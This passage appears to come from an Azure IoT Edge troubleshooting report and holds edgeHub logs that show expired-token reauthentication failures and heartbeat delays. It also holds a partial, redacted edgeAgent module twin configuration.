<6> 2019-11-28 19:25:27.433 +00:00 [INF] - Disposing MessagingServiceClient for device Id REMOVED BEFORE UPLOAD because of exception - Microsoft.Azure.Devices.Edge.Hub.Core.EdgeHubConnectionException: Connection closed for device REMOVED BEFORE UPLOAD.
<4> 2019-11-28 19:25:27.431 +00:00 [WRN] - Closing connection for device: REMOVED BEFORE UPLOAD, Microsoft.Azure.Devices.Edge.Hub.Core.EdgeHubConnectionException: Connection closed for device REMOVED BEFORE UPLOAD., 
<6> 2019-11-28 19:25:27.122 +00:00 [INF] - Unable to re-authenticate REMOVED BEFORE UPLOAD, dropping client connection.
<4> 2019-11-28 19:25:27.122 +00:00 [WRN] - Reauthenticating client REMOVED BEFORE UPLOAD failed, removing client connection
<6> 2019-11-28 19:25:26.625 +00:00 [INF] - Credentials for client REMOVED BEFORE UPLOAD are not valid.
<6> 2019-11-28 19:25:22.439 +00:00 [INF] - Error authenticating token for REMOVED BEFORE UPLOAD because the token is expired or could not be parsed
<6> 2019-11-28 19:25:18.801 +00:00 [INF] - Reauthenticating connected clients
<4> 2019-11-28 19:25:12.386 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:25:11 +00:00".
<4> 2019-11-28 19:24:39.571 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:24:39 +00:00".
<4> 2019-11-28 19:24:18.721 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:24:18 +00:00".
<4> 2019-11-28 19:24:15.275 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:24:14 +00:00".
<4> 2019-11-28 19:24:11.424 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:24:11 +00:00".
<4> 2019-11-28 19:24:02.296 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:24:01 +00:00".
<4> 2019-11-28 19:23:57.194 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:23:56 +00:00".
<4> 2019-11-28 19:23:10.929 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:23:10 +00:00".
<4> 2019-11-28 19:23:04.673 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:23:04 +00:00".
<4> 2019-11-28 19:22:58.616 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:22:57 +00:00".
<4> 2019-11-28 19:22:51.504 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:22:51 +00:00".
<4> 2019-11-28 19:22:43.331 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:22:42 +00:00".
<4> 2019-11-28 19:22:16.249 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:22:15 +00:00".
<4> 2019-11-28 19:22:07.958 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:22:07 +00:00".
<4> 2019-11-28 19:22:01.627 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:22:01 +00:00".
<4> 2019-11-28 19:21:53.277 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:21:52 +00:00".
<4> 2019-11-28 19:21:42.784 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:21:42 +00:00".
<4> 2019-11-28 19:21:16.308 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:21:03 +00:00".
<4> 2019-11-28 19:21:16.308 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:21:14 +00:00".
<6> 2019-11-28 19:20:16.286 +00:00 [INF] - Reauthenticating connected clients
<6> 2019-11-28 19:15:16.264 +00:00 [INF] - Reauthenticating connected clients
<6> 2019-11-28 19:10:16.266 +00:00 [INF] - Reauthenticating connected clients
<6> 2019-11-28 19:05:16.261 +00:00 [INF] - Reauthenticating connected clients
<6> 2019-11-28 19:03:05.165 +00:00 [INF] - Cleaned up 359 messages from queue for endpoint REMOVED BEFORE UPLOAD and 347 messages from message store.
<6> 2019-11-28 19:03:04.340 +00:00 [INF] - Started task to cleanup processed and stale messages for endpoint REMOVED BEFORE UPLOAD
<6> 2019-11-28 19:02:34.337 +00:00 [INF] - Cleaned up 93 messages from queue for endpoint iothub and 93 messages from message store.
<6> 2019-11-28 19:02:33.986 +00:00 [INF] - Started task to cleanup processed and stale messages for endpoint iothub
<6> 2019-11-28 19:02:03.989 +00:00 [INF] - Cleaned up 358 messages from queue for endpoint REMOVED BEFORE UPLOAD/ducoboxes_input and 11 messages from message store.
<6> 2019-11-28 19:02:03.164 +00:00 [INF] - Started task to cleanup processed and stale messages for endpoint REMOVED BEFORE UPLOAD
<6> 2019-11-28 19:00:16.258 +00:00 [INF] - Reauthenticating connected clients
<6> 2019-11-28 18:55:16.267 +00:00 [INF] - Reauthenticating connected clients
<6> 2019-11-28 18:50:16.265 +00:00 [INF] - Reauthenticating connected clients
<6> 2019-11-28 18:45:31.135 +00:00 [INF] - Updated reported properties for REMOVED BEFORE UPLOAD/$edgeHub
<6> 2019-11-28 18:45:30.932 +00:00 [INF] - Successfully completed periodic operation Get EdgeHub config
<6> 2019-11-28 18:45:30.926 +00:00 [INF] - Obtained edge hub config from module twin
<6> 2019-11-28 18:45:30.828 +00:00 [INF] - Starting periodic operation Get EdgeHub config...
<6> 2019-11-28 18:45:29.787 +00:00 [INF] - Starting refresh of device scope identities cache
<6> 2019-11-28 18:45:16.264 +00:00 [INF] - Reauthenticating connected clients
<6> 2019-11-28 18:45:10.578 +00:00 [INF] - Starting compaction of store REMOVED BEFORE UPLOAD
<6> 2019-11-28 18:45:10.577 +00:00 [INF] - Starting compaction of store iothub
<6> 2019-11-28 18:45:10.577 +00:00 [INF] - Starting compaction of store twins
<6> 2019-11-28 18:45:10.576 +00:00 [INF] - Starting compaction of store DeviceScopeCache
<6> 2019-11-28 18:45:10.576 +00:00 [INF] - Starting compaction of store sessions
<6> 2019-11-28 18:45:10.575 +00:00 [INF] - Starting compaction of store EdgeTwin
<6> 2019-11-28 18:45:10.574 +00:00 [INF] - Starting compaction of store default
<6> 2019-11-28 18:45:10.574 +00:00 [INF] - Starting compaction of store checkpoints
<6> 2019-11-28 18:45:10.573 +00:00 [INF] - Starting compaction of store messages
<6> 2019-11-28 18:45:10.572 +00:00 [INF] - Starting compaction of store ProductInfo
<6> 2019-11-28 18:45:10.565 +00:00 [INF] - Starting compaction of store REMOVED BEFORE UPLOAD
<6> 2019-11-28 18:45:10.564 +00:00 [INF] - Starting compaction of stores
<6> 2019-11-28 18:40:16.259 +00:00 [INF] - Reauthenticating connected clients
<6> 2019-11-28 18:35:16.257 +00:00 [INF] - Reauthenticating connected clients
<6> 2019-11-28 18:31:33.165 +00:00 [INF] - Cleaned up 358 messages from queue for endpoint REMOVED BEFORE UPLOAD and 347 messages from message store.
<6> 2019-11-28 18:31:32.358 +00:00 [INF] - Started task to cleanup processed and stale messages for endpoint REMOVED BEFORE UPLOAD
<6> 2019-11-28 18:31:02.353 +00:00 [INF] - Cleaned up 96 messages from queue for endpoint iothub and 96 messages from message store.
<6> 2019-11-28 18:31:01.924 +00:00 [INF] - Started task to cleanup processed and stale messages for endpoint iothub
<6> 2019-11-28 18:30:31.927 +00:00 [INF] - Cleaned up 359 messages from queue for endpoint REMOVED BEFORE UPLOAD and 12 messages from message store.
<6> 2019-11-28 18:30:31.085 +00:00 [INF] - Started task to cleanup processed and stale messages for endpoint REMOVED BEFORE UPLOAD
<6> 2019-11-28 18:30:16.266 +00:00 [INF] - Reauthenticating connected clients
<6> 2019-11-28 18:25:16.277 +00:00 [INF] - Reauthenticating connected clients
<6> 2019-11-28 18:20:21.750 +00:00 [INF] - Updated reported properties for REMOVED BEFORE UPLOAD/$edgeHub
<6> 2019-11-28 18:20:20.627 +00:00 [INF] - Set subscriptions from session state for REMOVED BEFORE UPLOAD
<6> 2019-11-28 18:20:20.626 +00:00 [INF] - Processing subscriptions TwinResponse, DesiredPropertyUpdates for client REMOVED BEFORE UPLOAD.
<6> 2019-11-28 18:20:20.623 +00:00 [INF] - Set subscriptions from session state for REMOVED BEFORE UPLOAD
<6> 2019-11-28 18:20:20.621 +00:00 [INF] - Processing subscriptions TwinResponse, DesiredPropertyUpdates for client REMOVED BEFORE UPLOAD.
<6> 2019-11-28 18:20:20.614 +00:00 [INF] - Binding message channel for device Id REMOVED BEFORE UPLOAD
<6> 2019-11-28 18:20:20.613 +00:00 [INF] - Bind device proxy for device REMOVED BEFORE UPLOAD
<6> 2019-11-28 18:20:20.612 +00:00 [INF] - New device connection for device REMOVED BEFORE UPLOAD
<6> 2019-11-28 18:20:20.610 +00:00 [INF] - ClientAuthenticated, REMOVED BEFORE UPLOAD, 59c62427
<6> 2019-11-28 18:20:20.609 +00:00 [INF] - Successfully generated identity for clientId REMOVED BEFORE UPLOAD and username REMOVED BEFORE UPLOAD/?api-version=2018-06-30&DeviceClientType=.NET%2F1.21.2%20%28.NET%20Core%204.6.28008.02%3B%20Linux%204.19.66-v7%2B%20%231253%20SMP%20Thu%20Aug%2015%2011%3A49%3A46%20BST%202019%3B%20Arm%29
<6> 2019-11-28 18:20:20.604 +00:00 [INF] - Client REMOVED BEFORE UPLOAD in device scope authenticated locally.
<6> 2019-11-28 18:20:20.501 +00:00 [INF] - Set subscriptions from session state for REMOVED BEFORE UPLOAD
<6> 2019-11-28 18:20:20.498 +00:00 [INF] - Processing subscriptions TwinResponse, ModuleMessages, Methods for client REMOVED BEFORE UPLOAD.
<6> 2019-11-28 18:20:20.495 +00:00 [INF] - Set subscriptions from session state for REMOVED BEFORE UPLOAD
<6> 2019-11-28 18:20:20.491 +00:00 [INF] - Processing subscriptions TwinResponse, ModuleMessages, Methods for client REMOVED BEFORE UPLOAD.
<6> 2019-11-28 18:20:20.482 +00:00 [INF] - Set subscriptions from session state for REMOVED BEFORE UPLOAD
<6> 2019-11-28 18:20:20.478 +00:00 [INF] - Processing subscriptions TwinResponse, ModuleMessages, DesiredPropertyUpdates, Methods for client REMOVED BEFORE UPLOAD.
<6> 2019-11-28 18:20:20.476 +00:00 [INF] - Set subscriptions from session state for REMOVED BEFORE UPLOAD
<6> 2019-11-28 18:20:20.473 +00:00 [INF] - Processing subscriptions TwinResponse, ModuleMessages, DesiredPropertyUpdates, Methods for client REMOVED BEFORE UPLOAD.
<6> 2019-11-28 18:20:20.464 +00:00 [INF] - Set subscriptions from session state for REMOVED BEFORE UPLOAD
<6> 2019-11-28 18:20:20.462 +00:00 [INF] - Processing subscriptions TwinResponse, ModuleMessages, DesiredPropertyUpdates, Methods for client REMOVED BEFORE UPLOAD.
<6> 2019-11-28 18:20:20.458 +00:00 [INF] - Set subscriptions from session state for REMOVED BEFORE UPLOAD
<6> 2019-11-28 18:20:19.309 +00:00 [INF] - Processing subscriptions TwinResponse, ModuleMessages, Methods for client REMOVED BEFORE UPLOAD.
<6> 2019-11-28 18:20:18.789 +00:00 [INF] - Binding message channel for device Id REMOVED BEFORE UPLOAD
<6> 2019-11-28 18:20:18.789 +00:00 [INF] - Bind device proxy for device REMOVED BEFORE UPLOAD
<6> 2019-11-28 18:20:18.787 +00:00 [INF] - New device connection for device REMOVED BEFORE UPLOAD
<6> 2019-11-28 18:20:18.783 +00:00 [INF] - Binding message channel for device Id REMOVED BEFORE UPLOAD
<6> 2019-11-28 18:20:18.782 +00:00 [INF] - Bind device proxy for device REMOVED BEFORE UPLOAD
<6> 2019-11-28 18:20:18.780 +00:00 [INF] - New device connection for device REMOVED BEFORE UPLOAD
<6> 2019-11-28 18:20:18.774 +00:00 [INF] - ClientAuthenticated, REMOVED BEFORE UPLOAD, 65f9af44
<6> 2019-11-28 18:20:18.773 +00:00 [INF] - Successfully generated identity for clientId REMOVED BEFORE UPLOAD and username REMOVED BEFORE UPLOAD/?api-version=2018-06-30&DeviceClientType=.NET%2F1.21.2%20%28.NET%20Core%204.6.28008.02%3B%20Linux%204.19.66-v7%2B%20%231253%20SMP%20Thu%20Aug%2015%2011%3A49%3A46%20BST%202019%3B%20Arm%29
<6> 2019-11-28 18:20:18.731 +00:00 [INF] - Client REMOVED BEFORE UPLOAD in device scope authenticated locally.
<6> 2019-11-28 18:20:18.729 +00:00 [INF] - ClientAuthenticated, REMOVED BEFORE UPLOAD, 72b4770a
<6> 2019-11-28 18:20:18.728 +00:00 [INF] - Successfully generated identity for clientId REMOVED BEFORE UPLOAD and username REMOVED BEFORE UPLOAD/?api-version=2018-06-30&DeviceClientType=.NET%2F1.21.2%20%28.NET%20Core%204.6.28008.02%3B%20Linux%204.19.66-v7%2B%20%231253%20SMP%20Thu%20Aug%2015%2011%3A49%3A46%20BST%202019%3B%20Arm%29
<6> 2019-11-28 18:20:18.726 +00:00 [INF] - Client REMOVED BEFORE UPLOAD in device scope authenticated locally.
<6> 2019-11-28 18:20:16.582 +00:00 [INF] - Updated reported properties for REMOVED BEFORE UPLOAD/$edgeHub
<6> 2019-11-28 18:20:16.374 +00:00 [INF] - Device connection removed for device REMOVED BEFORE UPLOAD
<6> 2019-11-28 18:20:16.374 +00:00 [INF] - Closing device proxy for device Id REMOVED BEFORE UPLOAD
<6> 2019-11-28 18:20:16.369 +00:00 [INF] - Disposing MessagingServiceClient for device Id REMOVED BEFORE UPLOAD because of exception - Microsoft.Azure.Devices.Edge.Hub.Core.EdgeHubConnectionException: Connection closed for device REMOVED BEFORE UPLOAD.
<4> 2019-11-28 18:20:16.368 +00:00 [WRN] - Closing connection for device: REMOVED BEFORE UPLOAD, Microsoft.Azure.Devices.Edge.Hub.Core.EdgeHubConnectionException: Connection closed for device REMOVED BEFORE UPLOAD., 
<6> 2019-11-28 18:20:16.368 +00:00 [INF] - Unable to re-authenticate REMOVED BEFORE UPLOAD, dropping client connection.
<4> 2019-11-28 18:20:16.366 +00:00 [WRN] - Reauthenticating client REMOVED BEFORE UPLOAD failed, removing client connection
<6> 2019-11-28 18:20:16.366 +00:00 [INF] - Credentials for client REMOVED BEFORE UPLOAD are not valid.
<6> 2019-11-28 18:20:16.364 +00:00 [INF] - Error authenticating token for REMOVED BEFORE UPLOAD because the token is expired or could not be parsed
<6> 2019-11-28 18:20:16.358 +00:00 [INF] - Device connection removed for device REMOVED BEFORE UPLOAD
<6> 2019-11-28 18:20:16.358 +00:00 [INF] - Closing device proxy for device Id REMOVED BEFORE UPLOAD
<6> 2019-11-28 18:20:16.356 +00:00 [INF] - Disposing MessagingServiceClient for device Id REMOVED BEFORE UPLOAD because of exception - Microsoft.Azure.Devices.Edge.Hub.Core.EdgeHubConnectionException: Connection closed for device REMOVED BEFORE UPLOAD.
<4> 2019-11-28 18:20:16.354 +00:00 [WRN] - Closing connection for device: REMOVED BEFORE UPLOAD, Microsoft.Azure.Devices.Edge.Hub.Core.EdgeHubConnectionException: Connection closed for device REMOVED BEFORE UPLOAD., 
<6> 2019-11-28 18:20:16.353 +00:00 [INF] - Unable to re-authenticate REMOVED BEFORE UPLOAD, dropping client connection.
<4> 2019-11-28 18:20:16.352 +00:00 [WRN] - Reauthenticating client REMOVED BEFORE UPLOAD failed, removing client connection
<6> 2019-11-28 18:20:16.352 +00:00 [INF] - Credentials for client REMOVED BEFORE UPLOAD are not valid.
<6> 2019-11-28 18:20:16.352 +00:00 [INF] - Error authenticating token for REMOVED BEFORE UPLOAD because the token is expired or could not be parsed
<6> 2019-11-28 18:20:16.304 +00:00 [INF] - Device connection removed for device REMOVED BEFORE UPLOAD
<6> 2019-11-28 18:20:16.303 +00:00 [INF] - Closing device proxy for device Id REMOVED BEFORE UPLOAD
<6> 2019-11-28 18:20:16.297 +00:00 [INF] - Disposing MessagingServiceClient for device Id REMOVED BEFORE UPLOAD because of exception - Microsoft.Azure.Devices.Edge.Hub.Core.EdgeHubConnectionException: Connection closed for device REMOVED BEFORE UPLOAD.
<4> 2019-11-28 18:20:16.297 +00:00 [WRN] - Closing connection for device: REMOVED BEFORE UPLOAD, Microsoft.Azure.Devices.Edge.Hub.Core.EdgeHubConnectionException: Connection closed for device REMOVED BEFORE UPLOAD., 
<6> 2019-11-28 18:20:16.295 +00:00 [INF] - Unable to re-authenticate REMOVED BEFORE UPLOAD, dropping client connection.
<4> 2019-11-28 18:20:16.281 +00:00 [WRN] - Reauthenticating client REMOVED BEFORE UPLOAD failed, removing client connection
<6> 2019-11-28 18:20:16.280 +00:00 [INF] - Credentials for client REMOVED BEFORE UPLOAD are not valid.
<6> 2019-11-28 18:20:16.279 +00:00 [INF] - Error authenticating token for REMOVED BEFORE UPLOAD because the token is expired or could not be parsed
<6> 2019-11-28 18:20:16.266 +00:00 [INF] - Reauthenticating connected clients
<6> 2019-11-28 18:15:16.263 +00:00 [INF] - Reauthenticating connected clients
<6> 2019-11-28 18:10:16.257 +00:00 [INF] - Reauthenticating connected clients
<6> 2019-11-28 18:05:16.265 +00:00 [INF] - Reauthenticating connected clients
<6> 2019-11-28 18:00:16.264 +00:00 [INF] - Reauthenticating connected clients
<6> 2019-11-28 18:00:01.073 +00:00 [INF] - Cleaned up 359 messages from queue for endpoint REMOVED BEFORE UPLOAD and 347 messages from message store.
<6> 2019-11-28 18:00:00.263 +00:00 [INF] - Started task to cleanup processed and stale messages for endpoint REMOVED BEFORE UPLOAD
<6> 2019-11-28 17:59:30.271 +00:00 [INF] - Cleaned up 93 messages from queue for endpoint iothub and 93 messages from message store.
<6> 2019-11-28 17:59:29.973 +00:00 [INF] - Started task to cleanup processed and stale messages for endpoint iothub
<6> 2019-11-28 17:58:59.981 +00:00 [INF] - Cleaned up 359 messages from queue for endpoint REMOVED BEFORE UPLOAD and 12 messages from message store.
<6> 2019-11-28 17:58:59.219 +00:00 [INF] - Started task to cleanup processed and stale messages for endpoint REMOVED BEFORE UPLOAD
<6> 2019-11-28 17:55:16.256 +00:00 [INF] - Reauthenticating connected clients
<6> 2019-11-28 17:50:16.264 +00:00 [INF] - Reauthenticating connected clients
<6> 2019-11-28 17:45:30.974 +00:00 [INF] - Updated reported properties for REMOVED BEFORE UPLOAD/$edgeHub
<6> 2019-11-28 17:45:30.826 +00:00 [INF] - Successfully completed periodic operation Get EdgeHub config
<6> 2019-11-28 17:45:30.825 +00:00 [INF] - Obtained edge hub config from module twin


```
</details>

<details>
<summary>current edgeAgent twin</summary>

```

{
  "deviceId": "REMOVED BEFORE UPLOADING",
  "moduleId": "$edgeAgent",
  "etag": "AAAAAAAAAA4=",
  "deviceEtag": "MTAwMjk0NDMwNw==",
  "status": "enabled",
  "statusUpdateTime": "0001-01-01T00:00:00Z",
  "connectionState": "Disconnected",
  "lastActivityTime": "0001-01-01T00:00:00Z",
  "cloudToDeviceMessageCount": 0,
  "authenticationType": "sas",
  "x509Thumbprint": {
    "primaryThumbprint": null,
    "secondaryThumbprint": null
  },
  "version": 47,
  "properties": {
    "desired": {
      "schemaVersion": "1.0",
      "runtime": {
        "type": "docker",
        "settings": {
          "minDockerVersion": "v1.25",
          "loggingOptions": "",
          "registryCredentials": {
            "REMOVED BEFORE UPLOADING": { }
            }
          }
        }
      },
      "systemModules": {
        "edgeAgent": {
          "type": "docker",
          "settings": {
            "image": "mcr.microsoft.com/azureiotedge-agent:1.0.8.4",
            "createOptions": "{}"
          }
        },
        "edgeHub": {
          "type": "docker",
          "status": "running",
          "restartPolicy": "always",
          "settings": {
            "image": "mcr.microsoft.com/azureiotedge-hub:1.0.8.4",
            "createOptions": "{\"HostConfig\":{\"PortBindings\":{\"5671/tcp\":[{\"HostPort\":\"5671\"}],\"8883/tcp\":[{\"HostPort\":\"8883\"}],\"443/tcp\":[{\"HostPort\":\"443\"}]}}}"
          },
          "env": {
            "OptimizeForPerformance": {
              "value": "false"
            }
          }
        }
      },
      "modules": {
        "CUSTOM MODULE 1": {
          "version": "1.0.0",
          "type": "docker",
          "status": "running",
          "restartPolicy": "always",
          "settings": {
            "image": "REMOVED BEFORE UPLOAD",
            "createOptions": "{\"HostConfig\":{\"NetworkMode\":\"host\"},\"NetworkingConfig\":{\"EndpointsConfig\":{\"host\":{}}}}"
          }
        },
        "CUSTOM MODULE 2": {
          "version": "1.0.0",
          "type": "docker",
          "status": "running",
          "restartPolicy": "always",
          "settings": {
            "image": "REMOVED BEFORE UPLOAD",
            "createOptions": "{\"HostConfig\":{\"Mounts\":[{\"Type\":\"bind\",\"Target\":\"/REMOVED BEFORE UPLOAD\",\"Source\":\"REMOVED BEFORE UPLOAD\"}]}}"
          }
        },
        "CUSTOM MODULE 3": {
          "version": "1.0.0",
          "type": "docker",
          "status": "running",
          "restartPolicy": "always",
          "settings": {
            "image": "REMOVED BEFORE UPLOAD",
            "createOptions": "{\"HostConfig\":{\"Mounts\":[{\"Type\":\"bind\",\"Target\":\"/REMOVED BEFORE UPLOAD\",\"Source\":\"REMOVED BEFORE UPLOAD\"}]}}"
          }
        },
        "EdgeLoggingSpout": {
          "version": "1.0.0",
          "type": "docker",
          "status": "running",
          "restartPolicy": "always",
          "settings": {
            "image": "veyalla/logspout-loganalytics:linux-arm32v7",
            "createOptions": "{\"Env\":[\"BACKLOG=false\",\"LOGSPOUT=ignore\",\"LOGANALYTICS_WORKSPACE_ID=REMOVED BEFORE UPLOAD\",\"LOGANALYTICS_WORKSPACE_SECRET=REMOVED BEFORE UPLOAD"],\"Cmd\":[\"loganalytics://\"],\"HostConfig\":{\"Binds\":[\"/var/run/docker.sock:/var/run/docker.sock\"]}}"
          }
        }
      },
      "$metadata": {
        "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
        "$lastUpdatedVersion": 14,
        "schemaVersion": {
          "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
          "$lastUpdatedVersion": 14,
          "$lastUpdatedBy": "v20191127_2_release_436",
          "$lastUpdatedByDigest": "637105260216639817"
        },
        "runtime": {
          "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
          "$lastUpdatedVersion": 14,
          "type": {
            "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
            "$lastUpdatedVersion": 14,
            "$lastUpdatedBy": "v20191127_2_release_436",
            "$lastUpdatedByDigest": "637105260216639817"
          },
          "settings": {
            "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
            "$lastUpdatedVersion": 14,
            "minDockerVersion": {
              "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
              "$lastUpdatedVersion": 14,
              "$lastUpdatedBy": "v20191127_2_release_436",
              "$lastUpdatedByDigest": "637105260216639817"
            },
            "loggingOptions": {
              "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
              "$lastUpdatedVersion": 14,
              "$lastUpdatedBy": "v20191127_2_release_436",
              "$lastUpdatedByDigest": "637105260216639817"
            },
            "registryCredentials": {"REMOVED BEFORE UPLOAD": ""}
              }
            }
          }
        },
        "systemModules": {
          "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
          "$lastUpdatedVersion": 14,
          "edgeAgent": {
            "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
            "$lastUpdatedVersion": 14,
            "type": {
              "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
              "$lastUpdatedVersion": 14,
              "$lastUpdatedBy": "v20191127_2_release_436",
              "$lastUpdatedByDigest": "637105260216639817"
            },
            "settings": {
              "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
              "$lastUpdatedVersion": 14,
              "image": {
                "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
                "$lastUpdatedVersion": 14,
                "$lastUpdatedBy": "v20191127_2_release_436",
                "$lastUpdatedByDigest": "637105260216639817"
              },
              "createOptions": {
                "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
                "$lastUpdatedVersion": 14,
                "$lastUpdatedBy": "v20191127_2_release_436",
                "$lastUpdatedByDigest": "637105260216639817"
              }
            }
          },
          "edgeHub": {
            "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
            "$lastUpdatedVersion": 14,
            "type": {
              "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
              "$lastUpdatedVersion": 14,
              "$lastUpdatedBy": "v20191127_2_release_436",
              "$lastUpdatedByDigest": "637105260216639817"
            },
            "status": {
              "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
              "$lastUpdatedVersion": 14,
              "$lastUpdatedBy": "v20191127_2_release_436",
              "$lastUpdatedByDigest": "637105260216639817"
            },
            "restartPolicy": {
              "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
              "$lastUpdatedVersion": 14,
              "$lastUpdatedBy": "v20191127_2_release_436",
              "$lastUpdatedByDigest": "637105260216639817"
            },
            "settings": {
              "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
              "$lastUpdatedVersion": 14,
              "image": {
                "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
                "$lastUpdatedVersion": 14,
                "$lastUpdatedBy": "v20191127_2_release_436",
                "$lastUpdatedByDigest": "637105260216639817"
              },
              "createOptions": {
                "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
                "$lastUpdatedVersion": 14,
                "$lastUpdatedBy": "v20191127_2_release_436",
                "$lastUpdatedByDigest": "637105260216639817"
              }
            },
            "env": {
              "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
              "$lastUpdatedVersion": 14,
              "OptimizeForPerformance": {
                "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
                "$lastUpdatedVersion": 14,
                "value": {
                  "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
                  "$lastUpdatedVersion": 14,
                  "$lastUpdatedBy": "v20191127_2_release_436",
                  "$lastUpdatedByDigest": "637105260216639817"
                }
              }
            }
          }
        },
        "modules": {
          "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
          "$lastUpdatedVersion": 14,
          "CUSTOM MODULE 1": {
            "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
            "$lastUpdatedVersion": 14,
            "version": {
              "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
              "$lastUpdatedVersion": 14,
              "$lastUpdatedBy": "v20191127_2_release_436",
              "$lastUpdatedByDigest": "637105260216639817"
            },
            "type": {
              "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
              "$lastUpdatedVersion": 14,
              "$lastUpdatedBy": "v20191127_2_release_436",
              "$lastUpdatedByDigest": "637105260216639817"
            },
            "status": {
              "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
              "$lastUpdatedVersion": 14,
              "$lastUpdatedBy": "v20191127_2_release_436",
              "$lastUpdatedByDigest": "637105260216639817"
            },
            "restartPolicy": {
              "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
              "$lastUpdatedVersion": 14,
              "$lastUpdatedBy": "v20191127_2_release_436",
              "$lastUpdatedByDigest": "637105260216639817"
            },
            "settings": {
              "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
              "$lastUpdatedVersion": 14,
              "image": {
                "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
                "$lastUpdatedVersion": 14,
                "$lastUpdatedBy": "v20191127_2_release_436",
                "$lastUpdatedByDigest": "637105260216639817"
              },
              "createOptions": {
                "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
                "$lastUpdatedVersion": 14,
                "$lastUpdatedBy": "v20191127_2_release_436",
                "$lastUpdatedByDigest": "637105260216639817"
              }
            }
          },
          "CUSTOM MODULE 2": {
            "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
            "$lastUpdatedVersion": 14,
            "version": {
              "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
              "$lastUpdatedVersion": 14,
              "$lastUpdatedBy": "v20191127_2_release_436",
              "$lastUpdatedByDigest": "637105260216639817"
            },
            "type": {
              "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
              "$lastUpdatedVersion": 14,
              "$lastUpdatedBy": "v20191127_2_release_436",
              "$lastUpdatedByDigest": "637105260216639817"
            },
            "status": {
              "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
              "$lastUpdatedVersion": 14,
              "$lastUpdatedBy": "v20191127_2_release_436",
              "$lastUpdatedByDigest": "637105260216639817"
            },
            "restartPolicy": {
              "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
              "$lastUpdatedVersion": 14,
              "$lastUpdatedBy": "v20191127_2_release_436",
              "$lastUpdatedByDigest": "637105260216639817"
            },
            "settings": {
              "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
              "$lastUpdatedVersion": 14,
              "image": {
                "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
                "$lastUpdatedVersion": 14,
                "$lastUpdatedBy": "v20191127_2_release_436",
                "$lastUpdatedByDigest": "637105260216639817"
              },
              "createOptions": {
                "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
                "$lastUpdatedVersion": 14,
                "$lastUpdatedBy": "v20191127_2_release_436",
                "$lastUpdatedByDigest": "637105260216639817"
              }
            }
          },
          "CUSTOM MODULE 3": {
            "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
            "$lastUpdatedVersion": 14,
            "version": {
              "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
              "$lastUpdatedVersion": 14,
              "$lastUpdatedBy": "v20191127_2_release_436",
              "$lastUpdatedByDigest": "637105260216639817"
            },
            "type": {
              "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
              "$lastUpdatedVersion": 14,
              "$lastUpdatedBy": "v20191127_2_release_436",
              "$lastUpdatedByDigest": "637105260216639817"
            },
            "status": {
              "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
              "$lastUpdatedVersion": 14,
              "$lastUpdatedBy": "v20191127_2_release_436",
              "$lastUpdatedByDigest": "637105260216639817"
            },
            "restartPolicy": {
              "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
              "$lastUpdatedVersion": 14,
